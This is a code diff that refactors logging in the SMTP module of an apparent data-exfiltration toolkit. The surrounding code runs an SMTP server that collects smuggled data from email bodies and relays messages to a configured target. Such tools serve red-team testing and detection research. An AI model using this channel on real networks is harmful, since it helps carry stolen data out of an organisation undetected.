@@ -17,13 +17,11 @@ class CustomSMTPServer(smtpd.SMTPServer):
 
     def process_message(self, peer, mailfrom, rcpttos, data):
         body = email.message_from_string(data).get_payload()
-        app_exfiltrate.log_message('info', "[smtp] Received email "\
-                "from {}".format(peer))
+        app_exfiltrate.log_message('info', f"[smtp] Received email from {peer}")
         try:
             self.handler(body)
         except Exception as e:
             print(e)
-            pass
 
 def send(data):
     if config.has_key('proxies') and config['proxies'] != [""]:
@@ -55,7 +53,9 @@ def relay_email(data):
     msg['Subject'] = subject
     server = smtplib.SMTP(target, port)
     try:
-        app_exfiltrate.log_message('info', "[proxy] [smtp] Relaying email to {}".format(target))
+        app_exfiltrate.log_message(
+            'info', f"[proxy] [smtp] Relaying email to {target}"
+        )
         server.sendmail(author, [recipient], msg.as_string())
     except:
         pass
@@ -64,14 +64,18 @@ def relay_email(data):
 
 def listen():
     port = config['port']
-    app_exfiltrate.log_message('info', "[smtp] Starting SMTP server on port {}".format(port))
+    app_exfiltrate.log_message(
+        'info', f"[smtp] Starting SMTP server on port {port}"
+    )
     server = CustomSMTPServer(('', port), None)
     server.handler = app_exfiltrate.retrieve_data
     asyncore.loop()
 
 def proxy():
     port = config['port']
-    app_exfiltrate.log_message('info', "[proxy] [smtp] Starting SMTP server on port {}".format(port))
+    app_exfiltrate.log_message(
+        'info', f"[proxy] [smtp] Starting SMTP server on port {port}"
+    )
     server = CustomSMTPServer(('', port), None)
     server.handler = relay_email
     asyncore.loop()
